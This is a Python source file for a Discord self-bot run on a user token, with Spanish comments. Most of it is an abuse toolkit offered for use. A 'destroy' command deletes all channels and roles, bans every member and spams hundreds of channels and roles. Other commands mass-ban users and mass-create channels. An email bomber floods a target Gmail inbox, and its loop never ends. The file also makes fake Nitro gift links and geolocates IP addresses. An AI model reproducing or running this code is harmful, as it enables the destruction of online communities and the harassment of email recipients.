from webserver import keep_alive
import smtplib
import os
import time
import datetime
from time import sleep
import json
import random
import string
from os import system, name
import os
from discord.ext import commands
import colorama
import asyncio
import re
import urllib.parse 
import io
import aiohttp
import discord
import requests
from colorama import Fore
import urllib.request
from urllib import parse, request
colorama.init()



def clear():
  system("cls")

TOKEN = os.environ['tokenn']

token = (TOKEN)

ping = False

bot = commands.Bot(command_prefix=("$"), self_bot=True)

def Nitro():
    code = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
    return f'https://discord.gift/{code}'

def GmailBomber():
    _smpt = smtplib.SMTP('smtp.gmail.com', 587)
    _smpt.starttls()
    username = input('Gmail: ')
    password = input('Gmail Password: ')
    try:
        _smpt.login(username, password)
    except:
        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW} Incorrect Password or gmail, make sure you've enabled less-secure apps access"+Fore.RESET)
    target = input('Target Gmail: ')
    message = input('Message to send: ')
    counter = eval(input('Ammount of times: '))
    count = 0
    while count < counter:
        count = 0
        _smpt.sendmail(username, target, message)
        count += 1
    if count == counter:
        pass

@bot.event
async def on_message(message):
  await bot.process_commands(message)

@bot.event
async def on_ready():
  print(f"{Fore.YELLOW}Logged as {Fore.RED}{bot.user}")

bot.remove_command("ayuda")

@bot.command()
async def ayuda(ctx):
  embed = discord.Embed(title='help', description='', color=0x1C1C1C)
  embed.set_footer(text='eazyduze')
  embed.set_thumbnail(url='url de su foto')
  await ctx.send(embed=embed)

@bot.command()
async def ig(ctx):
  await ctx.message.delete()
  embed = discord.Embed(title='ig', description='uwu', color=0x1C1C1C)
  embed.set_image(url='foto de su instagram')
  embed.set_footer(text='uwu')
  await ctx.send(embed=embed)

@bot.command()
async def purge(message):
  async for msg in message.channel.history(limit=10000):
    if msg.author == bot.user:
      try:
        await msg.delete()
      except:
        pass

@bot.command()
async def hypesquad(ctx, house):
  await ctx.message.delete()
  request = requests.session()
  headers = {
    'Authorization': token,
    'Content-Type': 'application/json'
  }

  global payload

  if house == "bravery":
    payload = {'house_id': 1}
  elif house == "brilliance":
    payload = {'house_id': 2}
  elif house == "balance":
    payload = {'house_id': 3}

  try:
    requests.post('https://discordapp.com/api/v6/hypesquad/online', headers=headers, json=payload)
    print(f"{Fore.GREEN}Has cambiado a {house} correctamente!")
  except:
    print(f"{Fore.RED}Ha ocurrido un error al intentar cambiarte a {house}")


@bot.command()
async def nitro(ctx): # b'\xfc'
    await ctx.message.delete()
    await ctx.send(Nitro())  

@bot.command(aliases=['geolocate', 'iptogeo', 'iptolocation', 'ip2geo', 'ip'])
async def geoip(ctx, *, ipaddr: str = '1.3.3.7'): # b'\xfc'
    await ctx.message.delete()
    r = requests.get(f'http://extreme-ip-lookup.com/json/{ipaddr}')
    geo = r.json()
    em = discord.Embed()
    fields = [
        {'name': 'IP', 'value': geo['query']},
        {'name': 'ipType', 'value': geo['ipType']},
        {'name': 'Country', 'value': geo['country']},
        {'name': 'City', 'value': geo['city']},
        {'name': 'Continent', 'value': geo['continent']},
        {'name': 'Country', 'value': geo['country']},
        {'name': 'IPName', 'value': geo['ipName']},
        {'name': 'ISP', 'value': geo['isp']},
        {'name': 'Latitute', 'value': geo['lat']},
        {'name': 'Longitude', 'value': geo['lon']},
        {'name': 'Org', 'value': geo['org']},
        {'name': 'Region', 'value': geo['region']},
        {'name': 'Status', 'value': geo['status']},
    ]
    for field in fields:
        if field['value']:
            em.add_field(name=field['name'], value=field['value'], inline=True)
    return await ctx.send(embed=em)

@bot.command()
async def pingweb(ctx, website = None): # b'\xfc'
    await ctx.message.delete()
    if website is None: 
        pass
    else:
        try:
            r = requests.get(website).status_code
        except Exception as e:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}"+Fore.RESET)
        if r == 404:
            await ctx.send(f'Site is down, responded with a status code of {r}', delete_after=3)
        else:
            await ctx.send(f'Site is up, responded with a status code of {r}', delete_after=3)   


@bot.command()
async def massban(ctx): # b'\xfc'
    await ctx.message.delete()
    for user in list(ctx.guild.members):
        try:
            await user.ban()
        except:
            pass  

@bot.command()
async def destroy(ctx): # b'\xfc'
    await ctx.message.delete()
    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()    
        except:
            pass
    for user in list(ctx.guild.members):
        try:
            await user.ban()
        except:
            pass    
    for role in list(ctx.guild.roles):
        try:
            await role.delete()
        except:
            pass
    try:
        await ctx.guild.edit(
            name='zzz',
            description="zzz",
            reason="su html de replit",
            icon=None,
            banner=None
        )  
    except:
        pass        
    for _i in range(250):
        await ctx.guild.create_text_channel(name='zzz')
    for _i in range(250):
        await ctx.guild.create_role(name='z')

@bot.command()
async def masschannel(ctx): # b'\xfc'
    await ctx.message.delete()
    for _i in range(250):
        try:
            await ctx.guild.create_text_channel(name='zzz')
        except:
            return

@bot.command()
async def tits(ctx): # b'\xfc'
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/tits")
    res = r.json()
    em = discord.Embed()    
    em.set_image(url=res['url'])
    await ctx.send(embed=em)

@bot.command(name='gmail-bomb', aliases=['gmail-bomber', 'gmailbomb', 'email-bomber', 'emailbomber'])
async def _gmail_bomb(ctx): # b'\xfc'
    await ctx.message.delete()
    GmailBomber()

while True:
  try:
    keep_alive()
    bot.run(token, bot=False)
  except:
    clear()
    print("El token es inválido")
    quit()